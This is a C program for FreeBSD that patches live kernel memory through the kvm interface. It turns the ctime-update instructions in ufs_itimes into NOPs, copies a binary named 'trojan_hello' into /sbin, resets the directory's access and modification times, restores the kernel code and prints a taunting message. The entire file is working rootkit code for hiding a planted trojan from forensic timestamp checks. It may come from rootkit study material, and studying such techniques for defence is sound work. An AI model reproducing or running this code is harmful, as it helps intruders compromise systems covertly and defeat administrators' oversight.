#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <nlist.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
//#include <sys/libkern.h>
//#include <sys/sysproto.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
//#include <sys/sysproto.h>
#define SIZE 450
#define T_NAME "trojan_hello"
#define DESTINATION "/sbin/."
/* Replacement code. */
unsigned char nop_code[] =
"\x90\x90\x90"; /* nop */
int main(int argc, char *argv[])
{
    int i, offset1, offset2;
    char errbuf[_POSIX2_LINE_MAX];
    kvm_t *kd;
    struct nlist nl[] = { {NULL}, {NULL}, };
    unsigned char ufs_itimes_code[SIZE];
    struct stat sb;
    struct timeval time[2];
    /* Initialize kernel virtual memory access. */
    kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
        if (kd == NULL) {
            fprintf(stderr, "ERROR: %s\n", errbuf);
            exit(-1);
        }
    nl[0].n_name = "ufs_itimes";
    if (kvm_nlist(kd, nl) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        exit(-1);
    }
    if (!nl[0].n_value) {
        fprintf(stderr, "ERROR: Symbol %s not found\n",
        nl[0].n_name);
        exit(-1);
    }
/* Save a copy of ufs_itimes. */
    if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        exit(-1);
    }
/*
* Search through ufs_itimes for the following two lines:
* DIP_SET(ip, i_ctime, ts.tv_sec);
* DIP_SET(ip, i_ctimensec, ts.tv_nsec);
*/
   for (i = 0; i < SIZE - 2; i++) {
        if (ufs_itimes_code[i] == 0x89 && ufs_itimes_code[i+1] == 0x42 && ufs_itimes_code[i+2] == 0x30)
            offset1 = i;
        if (ufs_itimes_code[i] == 0x89 &&
        ufs_itimes_code[i+1] == 0x4a &&
        ufs_itimes_code[i+2] == 0x34)
        offset2 = i;
    }
/* Save /sbin/'s access and modification times. */
    if (stat("/sbin", &sb) < 0) {
        fprintf(stderr, "STAT ERROR: %d\n", errno);
        exit(-1);
    }
    time[0].tv_sec = sb.st_atime;
    time[1].tv_sec = sb.st_mtime;
/* Patch ufs_itimes. */
    if (kvm_write(kd, nl[0].n_value + offset1, nop_code, sizeof(nop_code) - 1) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
         exit(-1);
     }
    if (kvm_write(kd, nl[0].n_value + offset2, nop_code, sizeof(nop_code) - 1) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
       exit(-1);
    }
    /* Copy T_NAME into DESTINATION. */
    char string[] = "cp" " " T_NAME " " DESTINATION;
    system(string);
/* Roll back /sbin/'s access and modification times. */
    if (utimes("/sbin", (struct timeval *)&time) < 0) {
       fprintf(stderr, "UTIMES ERROR: %d\n", errno);
       exit(-1);
    }
/* Restore ufs_itimes. */
    if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1], sizeof(nop_code) - 1) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
       exit(-1);
     }
    if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
        sizeof(nop_code) - 1) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        exit(-1);
    }
/* Close kd. */
    if (kvm_close(kd) < 0) {
        fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
        exit(-1);
    }
/* Print out a debug message, indicating our success. */
    printf("Y'all just mad. Because today, you suckers got served.\n");
    exit(0);
}
